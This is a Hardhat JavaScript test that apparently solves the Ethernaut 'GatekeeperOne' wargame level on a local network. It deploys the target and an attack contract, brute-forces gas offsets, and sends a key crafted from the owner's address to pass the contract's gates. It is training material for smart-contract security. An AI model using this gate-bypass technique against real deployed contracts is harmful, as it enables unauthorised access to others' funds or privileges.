const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("GateKeeperOne", function () {
  async function deployOneYearLockFixture() {
    const [owner, otherAccount] = await ethers.getSigners();
    const GateKeeperOneContract = await ethers.getContractFactory(
      "GatekeeperOne"
    );
    const GateKeeperOne = await GateKeeperOneContract.deploy();
    await GateKeeperOne.deployed();

    const AttackGateKeeperOneContract = await ethers.getContractFactory(
      "AttackGateKeeperOne"
    );
    const AttackGateKeeperOne = await AttackGateKeeperOneContract.deploy(
      GateKeeperOne.address
    );
    await AttackGateKeeperOne.deployed();

    return {
      owner,
      otherAccount,
      GateKeeperOne,
      AttackGateKeeperOne,
    };
  }

  describe("Deployment", function () {
    it("Should enter into the  GateKeeperOne Contract", async function () {
      const { owner, otherAccount, GateKeeperOne, AttackGateKeeperOne } =
        await loadFixture(deployOneYearLockFixture);
      const txOrigin = owner.address.slice(-4);
      console.log(txOrigin);
      for (let i = 0; i <= 8191; i++) {
        try {
          let entered = await AttackGateKeeperOne.Attack(
            `0x100000000000${txOrigin}`,
            800000 + i,
            {
              gasLimit: 950000,
            }
          );
          console.log("passed with gas ->", 800000 + i);
          if (entered) break;
        } catch {}
      }

      const entrant = await GateKeeperOne.entrant();
      expect(entrant).to.equal(owner.address);
    });
  });
});
